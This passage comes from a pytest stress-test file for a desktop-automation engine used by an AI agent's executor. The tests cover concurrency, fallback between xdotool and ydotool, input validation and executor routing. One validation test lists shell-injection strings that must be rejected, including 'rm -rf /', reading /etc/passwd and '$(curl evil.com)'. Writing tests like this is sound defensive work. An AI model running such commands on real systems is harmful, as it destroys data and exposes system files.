            nonlocal call_idx
            call_idx += 1
            if payload.get("mode") == "desktop":
                # Odd calls trigger recoverable error
                if call_idx % 3 == 0:
                    return {"success": False, "message": "window not found: test"}
                return {"success": True, "message": "xdotool OK"}
            return {"success": True, "message": "ydotool OK"}

        send_mock = AsyncMock(side_effect=_mixed_concurrent)

        async def _run():
            tasks = []
            for i in range(20):
                tasks.append(
                    _hybrid_mod.execute_desktop_hybrid_action(
                        action="click",
                        coordinates=[100, 200],
                    )
                )
            return await asyncio.gather(*tasks)

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            results = run_async(_run())

        assert len(results) == 20
        assert all(r["success"] for r in results)
        # Some used fallback, some didn't
        fallback_count = sum(1 for r in results if r["fallback_used"])
        direct_count = sum(1 for r in results if not r["fallback_used"])
        assert fallback_count + direct_count == 20


@pytest.mark.stress
@pytest.mark.phase5
class TestValidationStress:
    """Input validation under stress volume."""

    def test_rapid_validation_all_action_types(self):
        """Validate every supported action type in rapid succession."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})
        results = []

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for action in _SUPPORTED_ACTIONS:
                r = run_async(_timed_hybrid_dispatch(
                    action=action, text="test", coordinates=[100, 200],
                ))
                results.append(r)

        # No "Unsupported action" among supported actions
        unsupported = [r for r in results if "Unsupported action" in r.get("message", "")]
        assert len(unsupported) == 0

    def test_shell_metachar_rejection(self):
        """Shell injection attempts in run_command are blocked."""
        dangerous_texts = [
            "ls; rm -rf /",
            "echo hello | cat /etc/passwd",
            "test && whoami",
            "$(curl evil.com)",
            "`id`",
            'test"; drop table;',
            "hello\nworld",
            "test\x00null",
        ]
        for text in dangerous_texts:
            err = _validate("run_command", None, text)
            assert err is not None, f"Shell metachar not blocked: {text!r}"
            assert err["success"] is False
            assert "meta-characters" in err["message"].lower() or "disallowed" in err["message"].lower()

    def test_oversized_text_rejection(self):
        """Text exceeding 5000 chars is rejected."""
        huge_text = "x" * 5001
        # Actions that require text
        for action in ["type", "key"]:
            err = _validate(action, None, huge_text)
            assert err is not None
            assert err["success"] is False
            assert "too long" in err["message"].lower()

    def test_negative_coordinates_rejected(self):
        """Negative coordinates are rejected."""
        for action in ["click", "double_click", "hover"]:
            err = _validate(action, [-1, 200], "")
            assert err is not None
            assert err["success"] is False
            assert "non-negative" in err["message"].lower()

    def test_validation_throughput(self):
        """1000 validation calls complete under 1 second."""
        t0 = time.perf_counter()
        for i in range(1000):
            action = random.choice(list(_SUPPORTED_ACTIONS))
            _validate(action, [100, 200], "test text")
        elapsed_ms = (time.perf_counter() - t0) * 1000
        assert elapsed_ms < 1000, f"Validation too slow: {elapsed_ms:.0f}ms for 1000 calls"


@pytest.mark.stress
@pytest.mark.phase5
class TestDirectHandlerDispatch:
    """Direct hybrid function execution under rapid-fire conditions."""

    def test_rapid_click_dispatch(self):
        """50 rapid click actions via the hybrid engine."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                x = random.randint(50, 1390)
                y = random.randint(50, 850)
                result = run_async(
                    _timed_hybrid_dispatch("click", coordinates=[x, y])
                )
                metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        assert metrics.success_rate >= 0.95
        assert metrics.unsupported_action_errors == 0

    def test_rapid_type_dispatch(self):
        """50 rapid type actions via the hybrid engine."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                text = f"hybrid_stress_{i}_" + "z" * (i % 20)
                result = run_async(
                    _timed_hybrid_dispatch("type", text=text)
                )
                metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        assert metrics.success_rate >= 0.95
        assert metrics.unsupported_action_errors == 0

    def test_mixed_actions_rapid(self):
        """50 mixed action types dispatched rapidly."""
        send_mock = AsyncMock(return_value={"success": True, "message": "OK"})

        action_mix = [
            ("click",        {"coordinates": [400, 300]}),
            ("type",         {"text": "hello"}),
            ("key",          {"text": "Return"}),
            ("open_app",     {"text": "gedit"}),
            ("close_window", {"text": "gedit"}),
        ]
        metrics = HybridFallbackMetrics()

        with patch.object(_hybrid_mod, "_send_action", send_mock):
            for i in range(HYBRID_LOOP_CYCLES):
                act_name, params = action_mix[i % len(action_mix)]
                result = run_async(
                    _timed_hybrid_dispatch(act_name, **params)
                )
                metrics.classify_hybrid_result(result, result.get("_elapsed_ms", 0))

        assert metrics.success_rate >= 0.95
        assert metrics.unsupported_action_errors == 0


@pytest.mark.stress
@pytest.mark.phase5
class TestExecutorIntegration:
    """End-to-end through the executor with engine='desktop_hybrid'."""

    def test_executor_routes_to_hybrid_engine(self):
        """execute_action(engine='desktop_hybrid') dispatches correctly."""
        hybrid_mock = AsyncMock(return_value={
            "success": True,
            "message": "Hybrid OK",
            "engine": "desktop_hybrid",
            "primary_engine": "xdotool",
            "fallback_used": False,
            "fallback_engine": None,
            "duration_ms": 1.0,
            "error": None,
        })

        with patch(
            "backend.engines.desktop_hybrid_engine.execute_desktop_hybrid_action",
            hybrid_mock,
        ):
            action = AgentAction(action=ActionType.CLICK, coordinates=[100, 200])
            result = run_async(
                execute_action(action, mode="desktop", engine="desktop_hybrid")
            )

        assert result["success"] is True
        assert result["engine"] == "desktop_hybrid"
        assert hybrid_mock.call_count == 1

    def test_executor_50_cycle_loop(self):
        """50-cycle loop through the full executor path."""
        hybrid_mock = AsyncMock(return_value={
            "success": True,
            "message": "Hybrid OK",
            "engine": "desktop_hybrid",
            "primary_engine": "xdotool",
            "fallback_used": False,
            "fallback_engine": None,
            "duration_ms": 1.0,
            "error": None,
        })

        with patch(
            "backend.engines.desktop_hybrid_engine.execute_desktop_hybrid_action",
            hybrid_mock,
        ):
            for i in range(HYBRID_LOOP_CYCLES):
                app = _APPS[i % len(_APPS)]
                action = AgentAction(
                    action=ActionType.CLICK,
                    coordinates=[100 + (i % 10), 200 + (i % 10)],
                )
                result = run_async(
                    execute_action(action, mode="desktop", engine="desktop_hybrid")
                )
                assert result["success"] is True
                assert "Unsupported action" not in result.get("message", "")

        assert hybrid_mock.call_count == HYBRID_LOOP_CYCLES

    def test_executor_handles_hybrid_failure_gracefully(self):
        """Executor propagates hybrid failure without crashing."""
        hybrid_mock = AsyncMock(return_value={
            "success": False,
            "message": "xdotool: focus lost; ydotool: device unavailable",
            "engine": "desktop_hybrid",
            "primary_engine": "xdotool",
            "fallback_used": True,
            "fallback_engine": "ydotool",
            "duration_ms": 5.0,
            "error": {"type": "both_failed", "message": "both engines failed"},
        })

        with patch(
            "backend.engines.desktop_hybrid_engine.execute_desktop_hybrid_action",
            hybrid_mock,
        ):
            action = AgentAction(action=ActionType.CLICK, coordinates=[100, 200])
            result = run_async(
                execute_action(action, mode="desktop", engine="desktop_hybrid")
            )

        assert result["success"] is False
        assert result["engine"] == "desktop_hybrid"
        # No crash, no infinite loop — clean failure
